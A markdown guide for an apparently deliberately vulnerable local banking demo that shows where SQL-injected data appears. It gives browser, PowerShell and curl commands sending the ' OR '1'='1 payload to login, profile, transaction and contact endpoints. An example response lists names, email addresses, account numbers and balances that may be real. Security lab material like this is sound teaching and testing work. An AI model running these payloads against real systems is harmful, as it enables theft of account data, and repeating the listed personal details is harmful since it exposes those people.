# Where to See Exposed Profiles Data

## 🎯 Quick Answer

The exposed profiles are in the **API response** under the `allUsers` field (for login) or `results` field (for other endpoints).

## 📍 Method 1: Test HTML File (Easiest)

1. **Open `test-sqli.html` in your browser**
2. **Click any "Test SQL Injection" button**
3. **Scroll down** to see the results section
4. **Look for "All Users Exposed:"** - this shows all profiles in JSON format

**For Login Endpoint:**
- Shows `allUsers` array with all profiles
- Shows `user` object with first profile

**For Profiles/Transactions/Contact Messages:**
- Shows `results` array in a **table format**
- All columns visible in an HTML table

## 📍 Method 2: Browser Developer Tools

1. **Open your browser** (Chrome/Edge)
2. **Press F12** to open Developer Tools
3. **Go to Network tab**
4. **Perform SQL injection attack** (login with `' OR '1'='1`)
5. **Find the request** to `/api/vuln-login`
6. **Click on it** → Go to **Response** tab
7. **See the JSON** with `allUsers` array containing all profiles

Example response:
```json
{
  "success": true,
  "sqlInjectionDetected": true,
  "allUsers": [
    {
      "id": "...",
      "full_name": "adel elduhemy",
      "account_number": "9959456888",
      "balance": 1000,
      "email": "adel.elduhemy@gmail.com",
      ...
    },
    {
      "id": "...",
      "full_name": "Maged Abdelnasser",
      "account_number": "9951534465",
      "balance": 950.01,
      "email": "magedelgawish54@gmail.com",
      ...
    }
  ]
}
```

## 📍 Method 3: Direct API Calls

### Test Login Endpoint (exposes allUsers):
```bash
# PowerShell
$body = @{email='admin@finovia.com';password="' OR '1'='1"} | ConvertTo-Json
Invoke-WebRequest -Uri "http://localhost:8080/api/vuln-login" -Method POST -Body $body -ContentType "application/json" | Select-Object -ExpandProperty Content
```

### Test Profiles Endpoint (exposes results):
```bash
# PowerShell
Invoke-WebRequest -Uri "http://localhost:8080/api/vuln-profiles?account_number=' OR '1'='1" | Select-Object -ExpandProperty Content
```

### Test Transactions Endpoint:
```bash
Invoke-WebRequest -Uri "http://localhost:8080/api/vuln-transactions?account_number=' OR '1'='1" | Select-Object -ExpandProperty Content
```

### Test Contact Messages Endpoint:
```bash
Invoke-WebRequest -Uri "http://localhost:8080/api/vuln-contact-messages?email=' OR '1'='1" | Select-Object -ExpandProperty Content
```

## 📍 Method 4: Using curl (if available)

```bash
# Login endpoint
curl -X POST http://localhost:8080/api/vuln-login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@finovia.com\",\"password\":\"' OR '1'='1\"}"

# Profiles endpoint
curl "http://localhost:8080/api/vuln-profiles?account_number=' OR '1'='1"
```

## 📊 Response Structure

### Login Endpoint (`/api/vuln-login`):
- `allUsers`: Array of ALL profiles (when SQL injection succeeds)
- `user`: First profile from the array
- `profilesCount`: Total number of profiles in database

### Other Endpoints:
- `results`: Array of exposed records
- `count`: Number of records exposed
- `totalAmount`: (for transactions) Sum of all amounts

## 🔍 Current Data in Your Database

Based on the connection test, you have:
- **2 profiles** in the database
- **1 transaction**
- **1 contact message**

All of these will be exposed when SQL injection attacks succeed!

## 💡 Tip

The **easiest way** to see all exposed data is:
1. Open `test-sqli.html` in browser
2. Click the test buttons
3. All data appears in formatted tables/JSON



